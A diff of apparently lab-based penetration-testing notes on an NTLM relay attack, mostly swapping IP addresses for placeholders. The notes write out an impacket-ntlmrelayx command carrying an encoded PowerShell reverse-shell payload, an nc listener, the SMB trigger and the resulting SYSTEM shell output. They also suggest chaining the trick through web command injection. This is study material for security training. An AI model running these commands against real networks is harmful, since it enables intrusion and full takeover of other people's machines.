@@ -651,10 +651,10 @@ We'll use the dir command again to get back to the bind shell we already have an
 
 Note: Here, we don't use the local Administrator user for the relat attack like we did for PtH - so the target needs to have UAC remote restrictions disabled or command execution will fail. If UAC remote restrictions are enabled on a target, we can only use the local Administrator user for the relay.
 
-Let's use ntlmrelayx from the impacket library for this, which will set up an SMB server and relay the auth part of an incoming SMB connection to a target we choose. Use impacket-ntlmrelayx with --no-http-server, -smb2support, -t 111.111.111.111, and -c <command>. For the command, we will use a PS reverse shell one liner, base64 encoded executed as "powershell -enc JABjAGwAa..."
+Let's use ntlmrelayx from the impacket library for this, which will set up an SMB server and relay the auth part of an incoming SMB connection to a target we choose. Use impacket-ntlmrelayx with --no-http-server, -smb2support, -t 111.111.111.trgt, and -c <command>. For the command, we will use a PS reverse shell one liner, base64 encoded executed as "powershell -enc JABjAGwAa..."
 
 ```console
-$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+$ impacket-ntlmrelayx --no-http-server -smb2support -t 111.111.111.trgt -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 // the powershell command here is the same as from Common Web App Attacks:Using Executable Files, ip in powershell command should be kali attacker with port 8080
 
 // new tab
@@ -662,21 +662,21 @@ $ nc -nvlp 8080
 C:\Windows\system32>whoami
 whoami
 files01\files02admin
-C:\Windows\system32>dir \\192.168.119.2\test    // connect to kali smb share
+C:\Windows\system32>dir \\222.222.222.222\test    // connect to kali smb share
 
 // in ntlmrelayx tab we should see:
-[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
-[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
-[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more targets left!
+[*] SMBD-Thread-4: Received connection from 111.111.111.jmp, attacking target smb://192.168.50.212
+[*] Authenticating against smb://111.111.111.trgt as FILES01/FILES02ADMIN SUCCEED
+[*] SMBD-Thread-6: Connection from 111.111.111.jmp controlled, but there are no more targets left!
 ...
-[*] Executed specified command on host: 192.168.50.212
+[*] Executed specified command on host: 111.111.111.trgt
 
 // in nc listener tab we get shell
-connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
+connect to [222.222.222.222] from (UNKNOWN) [111.111.111.trgt] 49674
 whoami
 nt authority\system
 PS C:\Windows\system32> hostname
 FILES02
 ```
 
-Additional Example: Do you have powershell command injection on a web server through? Try to set up the powershell oneliner.
+Additional Example: Do you have powershell command injection on a web server page? Try to do the "dir \\kaliip\test" with the listeners to get SYSTEM.
